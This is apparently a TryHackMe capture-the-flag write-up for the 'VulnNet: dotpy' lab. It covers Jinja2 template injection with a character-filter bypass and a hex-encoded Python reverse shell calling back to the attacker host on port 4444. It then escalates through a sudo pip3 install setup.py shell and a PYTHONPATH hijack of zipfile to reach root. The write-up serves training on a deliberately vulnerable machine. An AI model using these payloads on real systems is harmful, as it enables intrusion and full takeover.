# **VulnNet: dotpy - TryHackMe**

*Target Ip. Address:10.48.178.69*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.178.69
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 05:00 +0000
Nmap scan report for 10.48.178.69 (10.48.178.69)
Host is up (0.039s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.48.178.69:8080/login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.95 second
```

So, we have only 1 port at 8080, running a Python server.

Heading to the website, we have a login page, where we can register. Let's create a new account.

<img width="1711" height="942" alt="image" src="https://github.com/user-attachments/assets/ee20c4d3-dde0-457e-85af-e083754a6f0f" />

Nothing, interesting but we find the error, which is providing a hint for SSTI.

<img width="1183" height="949" alt="image" src="https://github.com/user-attachments/assets/2923b618-535d-4af7-879e-5156c511ea74" />

The error message tells us that our input is evaluated. Let's confirm it.

<img width="1187" height="944" alt="Screenshot 2026-03-09 111612" src="https://github.com/user-attachments/assets/4aae1b0e-8872-4a05-9648-9d8e447548b5" />

That was a success. We had our input evaluated by the system. 

<img width="1181" height="947" alt="image" src="https://github.com/user-attachments/assets/2e443788-0f42-4a2a-b609-8d3ace0d63ae" />

We find it's a jinja template. Let's find a way to get in as many characters are getting filtered.

After some trial and error, I found a payload that can work.

```payload
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

Url encode it and send the request on the browser.

<img width="1183" height="943" alt="image" src="https://github.com/user-attachments/assets/de0974c8-9dd8-4870-8efe-8180e700459a" />

Now, we will try the similar to get a reverse shell.

We will use a python reverse shell for this one.

```payload
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.130.26",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

We will hex encode our python payload as well. We will use the following final payload.

```payload
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('pop')(401)('\x70\x79\x74\x68\x6f\x6e\x33\x20\x2d\x63\x20\x27\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x2c\x70\x74\x79\x2c\x73\x6f\x63\x6b\x65\x74\x3b\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x29\x3b\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28\x22\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x33\x30\x2e\x32\x36\x22\x2c\x34\x34\x34\x34\x29\x29\x3b\x5b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x66\x29\x66\x6f\x72\x20\x66\x20\x69\x6e\x28\x30\x2c\x31\x2c\x32\x29\x5d\x3b\x70\x74\x79\x2e\x73\x70\x61\x77\x6e\x28\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x22\x29\x27',shell=True,stdout=-1)|attr('communicate')()}}
```

Start a listener.

```bash
kali@kali:nc -nlvp 4444
listening on [any] 4444 ...
```

Send the request, shall receive a reverse shell shortly.

```bash
kali@kali:nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.130.26] from (UNKNOWN) [10.48.178.69] 53266
web@vulnnet-dotpy:~/shuriken-dotpy$ id
uid=1001(web) gid=1001(web) groups=1001(web)
```

We successfully received a shell as user web.

No user flag, but we have sudo privileges.

```bash
web@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```

We will use the method to escalate from here "*https://gtfobins.org/gtfobins/pip/*".

```bash
web@vulnnet-dotpy:~$ mkdir /tmp/exploit
web@vulnnet-dotpy:~$ echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' > /tmp/exploit/setup.py
```

Now, that is done, let's run the sudo command.

```bash
web@vulnnet-dotpy:/tmp$ sudo -u system-adm /usr/bin/pip3 install /tmp/exploit
Processing ./exploit
$ id
uid=1000(system-adm) gid=1000(system-adm) groups=1000(system-adm),24(cdrom)
```

That was success. Let's upgrade the tty.

```bash
$ python3 -c 'import pty; pty.spawn ("/bin/bash")'
system-adm@vulnnet-dotpy:/tmp/pip-ekbyvljo-build$
```

We find the first flag at home directory.

```bash
system-adm@vulnnet-dotpy:~$ cat user.txt
THM{91.....b4}
```

Let's see if we have any sudo privileges.

```bash
system-adm@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

We can run /opt/backup.py as root. Let's see what it has.

```bash
system-adm@vulnnet-dotpy:~$ cat /opt/backup.py
from datetime import datetime
from pathlib import Path
import zipfile


OBJECT_TO_BACKUP = '/home/manage'  # The file or directory to backup
BACKUP_DIRECTORY = '/var/backups'  # The location to store the backups in
MAX_BACKUP_AMOUNT = 300  # The maximum amount of backups to have in BACKUP_DIRECTORY


object_to_backup_path = Path(OBJECT_TO_BACKUP)
backup_directory_path = Path(BACKUP_DIRECTORY)
assert object_to_backup_path.exists()  # Validate the object we are about to backup exists before we continue

# Validate the backup directory exists and create if required
backup_directory_path.mkdir(parents=True, exist_ok=True)

# Get the amount of past backup zips in the backup directory already
existing_backups = [
    x for x in backup_directory_path.iterdir()
    if x.is_file() and x.suffix == '.zip' and x.name.startswith('backup-')
]

# Enforce max backups and delete oldest if there will be too many after the new backup
oldest_to_newest_backup_by_name = list(sorted(existing_backups, key=lambda f: f.name))
while len(oldest_to_newest_backup_by_name) >= MAX_BACKUP_AMOUNT:  # >= because we will have another soon
    backup_to_delete = oldest_to_newest_backup_by_name.pop(0)
    backup_to_delete.unlink()

# Create zip file (for both file and folder options)
backup_file_name = f'backup-{datetime.now().strftime("%Y%m%d%H%M%S")}-{object_to_backup_path.name}.zip'
zip_file = zipfile.ZipFile(str(backup_directory_path / backup_file_name), mode='w')
if object_to_backup_path.is_file():
    # If the object to write is a file, write the file
    zip_file.write(
        object_to_backup_path.absolute(),
        arcname=object_to_backup_path.name,
        compress_type=zipfile.ZIP_DEFLATED
    )
elif object_to_backup_path.is_dir():
    # If the object to write is a directory, write all the files
    for file in object_to_backup_path.glob('**/*'):
        if file.is_file():
            zip_file.write(
                file.absolute(),
                arcname=str(file.relative_to(object_to_backup_path)),
                compress_type=zipfile.ZIP_DEFLATED
            )
# Close the created zip file
zip_file.close()
```

That is all good. We know that this is using zipfile library and we have SETENV permissions. We will do python library hijacking for escalation.

```bash
system-adm@vulnnet-dotpy:~$ echo 'import pty; pty.spawn("/bin/bash")' > zipfile.py
```

That is set, let's run the sudo command.

```bash
system-adm@vulnnet-dotpy:~$ sudo PYTHONPATH=/home/system-adm /usr/bin/python3 /opt/backup.py
root@vulnnet-dotpy:/home/system-adm# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root. Let's read the final flag and end this challenge.

```bash
root@vulnnet-dotpy:~# cat root.txt
THM{73.....fb}
```
